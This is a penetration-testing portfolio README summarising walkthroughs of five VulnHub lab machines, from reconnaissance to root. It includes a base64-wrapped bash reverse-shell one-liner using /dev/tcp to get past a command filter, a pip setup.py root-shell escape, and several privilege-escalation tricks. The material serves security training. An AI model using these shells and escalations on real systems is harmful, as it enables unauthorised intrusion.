# Offensive-CTF-Lab
# 🔴 VulnHub CTF Walkthroughs

A collection of penetration testing walkthroughs for VulnHub machines, documenting the full methodology from initial reconnaissance to root — reflecting a real-world offensive security workflow.

> 📄 **Full detailed writeups (with screenshots) are in [`VulnHub_CTF_Walkthroughs.docx`](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/Offensive_lab_Documentation.pdf)** — this README gives a quick-reference summary of each box.

---

## Methodology

Every machine in this repo follows the same five-phase approach:

| Phase | Focus |
|---|---|
| **1. Reconnaissance & Host Discovery** | Identify the target on the network |
| **2. Scanning** | Enumerate open ports and running services |
| **3. Enumeration** | Dig into services for weaknesses or exposed data |
| **4. Exploitation** | Gain an initial foothold / shell |
| **5. Privilege Escalation** | Escalate from low-privileged user to root |

---

## 🖥️ Machines

| # | Machine | Key Techniques | Status |
|---|---|---|---|
| 01 | [Matrix-Breakout: 2 Morpheus](#01--matrix-breakout-2-morpheus) | Parameter tampering, Burp Suite, Dirty Pipe (CVE-2022-0847) | ✅ Rooted |
| 02 | [Jangow: 1.0.1](#02--jangow-101) | Command injection, credential leak, FTP foothold | ✅ Rooted |
| 03 | [The Planets: Earth](#03--the-planets-earth) | Virtual hosts, XOR decryption, custom SUID binary abuse | ✅ Rooted |
| 04 | [Empire: LupinOne](#04--empire-lupinone) | wfuzz, Base58 SSH key recovery, Python module hijack, GTFOBins | ✅ Rooted |
| 05 | [Empire Breakout](#05--empire-breakout) | Brainfuck decoding, credential reuse, Linux capabilities (`tar`) | ✅ Rooted |
| 06 | Red: 1 | — | Coming soon |

---

## 01 — Matrix-Breakout: 2 Morpheus

**Path:** Web enumeration → parameter manipulation (Burp Suite) → arbitrary file write → PHP web shell → Dirty Pipe kernel exploit → root

- Discovered a message-board page (`graffiti.php`) writing user input to `graffiti.txt`
- Used Burp Repeater to change the target filename parameter, confirming arbitrary file write
- Uploaded a PHP reverse shell in place of the expected output file
- Upgraded to a full TTY, then escalated via the **Dirty Pipe** kernel exploit (CVE-2022-0847)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
uname -r   # confirmed vulnerable kernel
```

<!-- 📷 Add screenshots here: host discovery, nmap scan, Burp Repeater, web shell, Dirty Pipe root shell -->
![host_discovery](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/1-Matrix/Screenshots/1%20-%20Screenshot%202026-07-06%20145019.png)
![nmap_scan](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/1-Matrix/Screenshots/3%20-%20Screenshot%202026-07-06%20145823.png)
![Burp_suite](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/1-Matrix/Screenshots/11-%20Screenshot%202026-07-06%20160507.png)
![Web_Shell](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/1-Matrix/Screenshots/12%20-%20Screenshot%202026-07-06%20160709.png)
![Dirt_Pipe](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/1-Matrix/Screenshots/18%20-%20Screenshot%202026-07-06%20163040.png)

---

## 02 — Jangow: 1.0.1

**Path:** Command injection → local file read → leaked FTP credentials → FTP foothold → outdated kernel exploit → root

- Found a classic command-injection point on a "Buscar" (search) page: `busque.php?buscar=`
- Used the injection to read `/etc/passwd` and a `.backup` file in the web root, leaking FTP credentials
- Logged in over FTP directly with the recovered creds (web-based reverse shell attempts didn't pan out)
- Identified an outdated kernel and ran a matching public privilege escalation exploit, transferred over FTP

```bash
cat /var/www/html/.backup    # -> jangow01 : abygurl69
chmod 777 shell.sh && ./shell.sh
```

<!-- 📷 Add screenshots here: host discovery, nmap scan, command injection, credential discovery, root shell -->
![host](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/2%20-%20Jangow01/Screenshots/1.png)
![nmap_scan](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/2%20-%20Jangow01/Screenshots/3-Screenshot%202026-07-06%20211118.png)
![command_Injection](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/2%20-%20Jangow01/Screenshots/9-Screenshot%202026-07-06%20212028.png)
![Credential](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/2%20-%20Jangow01/Screenshots/10-Screenshot%202026-07-06%20212125.png)
![root_shell](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/2%20-%20Jangow01/Screenshots/13-Screenshot%202026-07-06%20223514.png)
![Flag](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/2%20-%20Jangow01/Screenshots/14-Screenshot%202026-07-07%20170700.png)

---

## 03 — The Planets: Earth

**Path:** Virtual host discovery → hidden `robots.txt` → XOR-encrypted admin password → filtered CLI bypass (base64) → SUID binary reverse-engineering → root

- Found two virtual hosts (`earth.local`, `terratest.earth.local`) via the SSL certificate's SAN field
- `robots.txt` on the HTTPS vhost only (not HTTP) revealed encryption hints and the admin username
- Decrypted the admin password from XOR-encoded strings on the homepage using CyberChef
- Logged into an admin CLI panel; bypassed its plaintext command filter by base64-encoding the reverse shell payload
- Found a custom SUID binary (`reset_root`), pulled it back to Kali via netcat, traced it with `ltrace`, and satisfied its hidden directory requirements to trigger a root password reset

```bash
echo "bash -i >& /dev/tcp/<IP>/4444 0>&1" | base64
# paste + decode on target:
echo '<b64>' | base64 -d | bash

ltrace ./reset_root   # revealed required dirs
su root                # password: Earth
```

<!-- 📷 Add screenshots here: vhost discovery, CyberChef XOR decode, admin CLI bypass, ltrace output, root flag -->
![host](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/3%20-%20Earth/Screenshots/1-Screenshot%202026-07-07%20171639.png)
![nmap_scan](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/3%20-%20Earth/Screenshots/3-Screenshot%202026-07-07%20172511.png)
![robot](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/3%20-%20Earth/Screenshots/4-Screenshot%202026-07-07%20200014.png)
![testing_notes](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/3%20-%20Earth/Screenshots/5-Screenshot%202026-07-07%20203451.png)
![Shell](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/3%20-%20Earth/Screenshots/8-Screenshot%202026-07-08%20010325.png)
![shell](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/3%20-%20Earth/Screenshots/9-Screenshot%202026-07-08%20010313.png)
![Prv_esc](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/3%20-%20Earth/Screenshots/15-Screenshot%202026-07-08%20121325.png)
![flag](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/3%20-%20Earth/Screenshots/16-Screenshot%202026-07-08%20121424.png)

---

## 04 — Empire: LupinOne

**Path:** wfuzz-based fuzzing → hidden secret path → Base58-encoded SSH key → John the Ripper → SSH foothold → Python module hijack → GTFOBins (`pip`) → root

- `robots.txt` disallowed `/~myfiles`; standard brute-forcing failed, so `wfuzz` was used to fuzz tilde-prefixed paths
- Found `/~secret` → `.mysecret.txt`, containing a Base58-encoded, passphrase-protected SSH private key
- Decoded the key with CyberChef, converted it with `ssh2john`, and cracked the passphrase with John the Ripper (`fasttrack.txt`)
- SSH'd in as `icex64`, then abused a `sudo` NOPASSWD entry on a script importing Python's `webbrowser` module by patching the module itself to spawn a shell → pivoted to `arsene`
- Found a second NOPASSWD entry for `pip`, used the documented [GTFOBins](https://gtfobins.github.io/gtfobins/pip/) technique to install a malicious package and spawn a root shell

```bash
ssh2john ssh_pvtKey > hash.txt
john --wordlist=/usr/share/wordlists/fasttrack.txt hash.txt

sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py   # after patching webbrowser.py

TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh','sh','-c','sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo /usr/bin/pip install $TF
```

<!-- 📷 Add screenshots here: wfuzz results, CyberChef Base58 decode, John crack, SSH login, privesc chain -->
![host](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/4%20-%20Empire_Lup_One/Screenshots/1-Screenshot%202026-07-08%20163802.png)
![wfuzz](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/4%20-%20Empire_Lup_One/Screenshots/4-Screenshot%202026-07-08%20172122.png)
![mysecret](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/4%20-%20Empire_Lup_One/Screenshots/5-Screenshot%202026-07-08%20172610.png)
![john](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/4%20-%20Empire_Lup_One/Screenshots/6-Screenshot%202026-07-08%20205752.png)
![cracked_pass](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/4%20-%20Empire_Lup_One/Screenshots/7-Screenshot%202026-07-08%20210141.png)
![SSH_login](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/4%20-%20Empire_Lup_One/Screenshots/8-Screenshot%202026-07-08%20211500.png)
![prv_esc](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/4%20-%20Empire_Lup_One/Screenshots/12-Screenshot%202026-07-08%20223645.png)
![root](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/4%20-%20Empire_Lup_One/Screenshots/14-Screenshot%202026-07-08%20224914.png)

---

## 05 — Empire Breakout

**Path:** Nmap enumeration → Webmin/Usermin discovery → Brainfuck-encoded password in page source → credential reuse via `enum4linux` → Usermin reverse shell → Linux capabilities (`tar`) abuse → root

- Comprehensive Nmap scan revealed five open ports — HTTP (80), NetBIOS (139), SMB (445), and two admin panels on 10000 (Webmin) and 20000 (Usermin)
- SMB version 6.1.0 fingerprinted via Metasploit; only a DoS vulnerability existed for it, so it was ruled out as a shell vector
- Found an unusual **Brainfuck-encoded** string in the Apache page source and decoded it with CyberChef, recovering a password
- Re-ran `enum4linux` with the new lead and enumerated a valid local username: `cyber`
- Logged into Usermin with the recovered credentials and triggered a netcat reverse shell (Metasploit meterpreter attempt failed)
- `sudo` wasn't installed on the target, so privilege escalation pivoted to Linux **capabilities** (`getcap`) instead of the usual SUID/sudo checks
- Found `tar` had elevated file-read capabilities, used it to archive and extract a protected backup file (`.old_pass.bak`) outside normal permissions, recovering the root password

```bash
# Brainfuck decode (via CyberChef) recovered: .2uqPEfj3D<P'a-3
enum4linux -a 192.168.50.11   # -> user: cyber

getcap -r / 2>/dev/null
# /home/cyber/tar cap_dac_read_search=ep

./tar -cvf pass.tar /var/backups/.old_pass.bak
./tar -xf pass.tar             # -> Ts&4&YurgtRX(=~h

su root
```

<!-- 📷 Add screenshots here: nmap scan, Brainfuck string + CyberChef decode, enum4linux user, Usermin shell, getcap output, root access -->
![host](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/5%20-%20Empire_Breakout/Screenshots/1-Screenshot%202026-07-09%20104853.png)
![Brainfuck](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/5%20-%20Empire_Breakout/Screenshots/5-Screenshot%202026-07-09%20111000.png)
![userMin](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/5%20-%20Empire_Breakout/Screenshots/7-Screenshot%202026-07-09%20112210.png)
![Shell](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/5%20-%20Empire_Breakout/Screenshots/9-Screenshot%202026-07-09%20112458.png)
![prv_esc](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/5%20-%20Empire_Breakout/Screenshots/12-Screenshot%202026-07-09%20113841.png)
![root](https://github.com/Abin-2820/Offensive-CTF-Lab/blob/main/5%20-%20Empire_Breakout/Screenshots/Screenshot%202026-07-09%20114558.png)

---

## 🛠️ Tools Used Across This Series

`nmap` · `netdiscover` · `gobuster` · `wfuzz` · `Burp Suite` · `CyberChef` · `John the Ripper` · `ssh2john` · `ltrace` · `getcap` · `netcat` · `enum4linux` · `Metasploit`

---

## 📌 Notes

- All machines were run in an isolated NAT lab network, attacker and target on the same subnet.
- Full command output, reasoning, and screenshots for each phase are documented in the companion `.docx` report.
- Machine 06 (**Red: 1**) will be added once its writeup is finalized.

---

*Part of an ongoing offensive security portfolio — built while training toward a red team / penetration testing role.*
